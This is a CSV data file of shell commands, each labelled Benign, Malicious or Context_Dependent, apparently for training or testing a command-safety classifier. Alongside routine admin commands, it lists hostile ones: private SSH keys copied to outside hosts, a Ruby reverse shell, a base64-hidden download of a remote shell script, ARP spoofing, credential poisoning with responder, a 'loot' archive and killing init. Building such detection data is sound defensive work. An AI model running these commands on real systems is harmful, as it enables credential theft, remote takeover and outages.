command,label,original_label,mitre_id
ssh -L 3653:10.0.0.100:5432 admin@10.0.0.100,Context_Dependent,ContextAugment,ContextAugment
ssh -R 9200:127.0.0.1:9200 ansible@audit-box,Benign,ContextAugment,ContextAugment
docker stats --no-stream,Benign,ContextAugment,ContextAugment
ettercap -T -q -i eth0 -M arp:remote /172.16.0.30// /192.168.1.20//,Malicious,ContextAugment,ContextAugment
tar czf /tmp/ssh-stage.tgz /etc/ssh 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
scp /root/.ssh/id_rsa user@203.0.113.42:/tmp/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
scp /etc/os-release audit@10.0.0.110:/tmp/,Context_Dependent,ContextAugment,ContextAugment
scp /etc/os-release audit@10.0.0.100:/tmp/,Context_Dependent,ContextAugment,ContextAugment
scp /etc/os-release audit@10.0.0.60:/tmp/,Context_Dependent,ContextAugment,ContextAugment
gdb -batch -p $(pgrep java) -ex 'generate-core-file /tmp/java.core',Context_Dependent,ContextAugment,ContextAugment
tcpdump -i eth0 host 192.168.1.20 -w /tmp/host.pcap,Context_Dependent,ContextAugment,ContextAugment
ssh -L 7705:10.0.0.110:9090 user@10.0.0.110,Context_Dependent,ContextAugment,ContextAugment
ssh -L 8505:internal-api.company.local:5432 sre@log-collector,Benign,ContextAugment,ContextAugment
strace -ff -o /tmp/dockerd.trace -p $(pgrep dockerd),Benign,ContextAugment,ContextAugment
sudo tcpdump -i eth0 port 3306 -c 100 -w /tmp/capture.pcap,Benign,ContextAugment,ContextAugment
ssh -L 8696:db.internal:8443 terraform@log-collector,Benign,ContextAugment,ContextAugment
kubectl exec deploy/web -- sh -c 'tar cz /var/log/app' > /tmp/web-logs.tar.gz,Benign,ContextAugment,ContextAugment
bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.50;arp.spoof on',Malicious,ContextAugment,ContextAugment
scp /var/log/syslog ansible@10.0.0.50:/srv/review/,Benign,ContextAugment,ContextAugment
python3 -m http.server 0.0.0.0 8080,Context_Dependent,ContextAugment,ContextAugment
strace -p $(pgrep dockerd) -e trace=network -o /tmp/dockerd-net.trace,Benign,ContextAugment,ContextAugment
python3 -m http.server 0.0.0.0 8000 --directory /srv/support-bundles,Benign,ContextAugment,ContextAugment
tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 3306,Benign,ContextAugment,ContextAugment
kill -9 1,Malicious,ContextAugment,ContextAugment
ssh -L 8189:localhost:443 support@bastion,Benign,ContextAugment,ContextAugment
"find /srv/app -type f -name ""*.conf"" -exec grep -l ""db_pass"" {} \; 2>/dev/null",Context_Dependent,ContextAugment,ContextAugment
kubectl auth can-i --list,Context_Dependent,ContextAugment,ContextAugment
gdb -batch -p $(pgrep apache2) -ex 'thread apply all bt',Benign,ContextAugment,ContextAugment
ltrace -p $(pgrep postgres) -o /tmp/postgres-debug.ltrace,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/nginx/ support@jump.internal:/srv/review/nginx-logs/,Benign,ContextAugment,ContextAugment
"find /etc -type f -name ""*.conf"" -exec grep -l ""secret"" {} \; 2>/dev/null",Context_Dependent,ContextAugment,ContextAugment
scp /var/log/app/app.log ops@bastion:/srv/forensics/,Benign,ContextAugment,ContextAugment
scp /var/log/messages audit@172.16.1.5:/srv/forensics/,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/ dba@10.0.0.30:/srv/snapshots/host-logs/,Benign,ContextAugment,ContextAugment
ssh -R 8080:127.0.0.1:8080 user@10.0.0.30,Context_Dependent,ContextAugment,ContextAugment
wget -q https://github.com/prometheus/node_exporter/releases/download/v1.7.0/node_exporter-1.7.0.linux-amd64.tar.gz -O /tmp/ne.tar.gz,Benign,ContextAugment,ContextAugment
nmap -O 192.168.1.10,Context_Dependent,ContextAugment,ContextAugment
nmap -sT -Pn 172.16.1.5,Context_Dependent,ContextAugment,ContextAugment
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA,Malicious,ContextAugment,ContextAugment
chisel client 10.0.0.50:8080 R:1080:socks,Context_Dependent,ContextAugment,ContextAugment
python3 -m http.server 0.0.0.0 9000,Context_Dependent,ContextAugment,ContextAugment
tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null,Malicious,ContextAugment,ContextAugment
chisel client 172.16.2.8:8080 R:1080:socks,Context_Dependent,ContextAugment,ContextAugment
ssh -D 1080 -fNq root@10.0.0.110,Context_Dependent,ContextAugment,ContextAugment
aa-status,Benign,ContextAugment,ContextAugment
scp /var/log/nginx/access.log sre@172.16.0.10:/srv/incident-logs/,Benign,ContextAugment,ContextAugment
scp /var/log/nginx/error.log terraform@192.168.1.10:/var/backups/,Benign,ContextAugment,ContextAugment
rsync -avz /srv/app/config ops@ci.internal:/srv/review/config/,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/ terraform@10.0.0.90:/srv/review/host-logs/,Benign,ContextAugment,ContextAugment
python3 -m http.server 0.0.0.0 9090 --directory /srv/releases/current,Benign,ContextAugment,ContextAugment
crontab -l -u root,Context_Dependent,ContextAugment,ContextAugment
"grep -ri ""password"" /etc 2>/dev/null | head -20",Context_Dependent,ContextAugment,ContextAugment
ssh -L 8118:internal-api.company.local:3306 sre@monitor.corp,Benign,ContextAugment,ContextAugment
scp /root/.ssh/id_rsa root@198.51.100.9:/tmp/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
ltrace -p $(pgrep nginx) -o /tmp/nginx-debug.ltrace,Benign,ContextAugment,ContextAugment
"python3 -c ""import http.server,socketserver;socketserver.TCPServer((\""0.0.0.0\"",9443),http.server.SimpleHTTPRequestHandler).serve_forever()""",Context_Dependent,ContextAugment,ContextAugment
scp /etc/ssl/certs/company.pem ci@192.168.1.30:/var/backups/cert-audit/,Benign,ContextAugment,ContextAugment
"ruby -rsocket -e'f=TCPSocket.open(""10.0.0.5"",5555).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Malicious,ContextAugment,ContextAugment
ssh -L 9206:localhost:9090 ops@ci.internal,Benign,ContextAugment,ContextAugment
rsync -avz /var/log/nginx/ ansible@ci.internal:/srv/review/nginx-logs/,Benign,ContextAugment,ContextAugment
nmap -sV --script=default 10.0.0.20,Context_Dependent,ContextAugment,ContextAugment
responder -I eth0 -wrf,Malicious,ContextAugment,ContextAugment
tcpdump -i eth0 host 10.0.0.70 -w /tmp/host.pcap,Context_Dependent,ContextAugment,ContextAugment
pkill -9 sshd,Malicious,ContextAugment,ContextAugment
nmap -sV 10.0.0.90,Context_Dependent,ContextAugment,ContextAugment
"python3 -c ""import http.server,socketserver;socketserver.TCPServer((\""0.0.0.0\"",8080),http.server.SimpleHTTPRequestHandler).serve_forever()""",Context_Dependent,ContextAugment,ContextAugment
docker exec db pg_dump -U app appdb > /tmp/app-backup.sql,Benign,ContextAugment,ContextAugment
"bash -c ""$(echo Y3VybCBodHRwOi8vbWFsd2FyZS5jb20vc2hlbGwuc2g= | base64 -d)""",Malicious,ContextAugment,ContextAugment
scp /var/log/messages ci@172.16.0.20:/srv/incident-logs/,Benign,ContextAugment,ContextAugment
tar cz /etc /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -k secret -out /tmp/ssh.enc,Malicious,ContextAugment,ContextAugment
strace -ff -o /tmp/python3.trace -p $(pgrep python3),Benign,ContextAugment,ContextAugment
nmap -sV 172.16.1.5,Context_Dependent,ContextAugment,ContextAugment
kubectl get secrets -A,Context_Dependent,ContextAugment,ContextAugment
"python3 -c ""import pty; pty.spawn('/bin/bash')""",Malicious,ContextAugment,ContextAugment
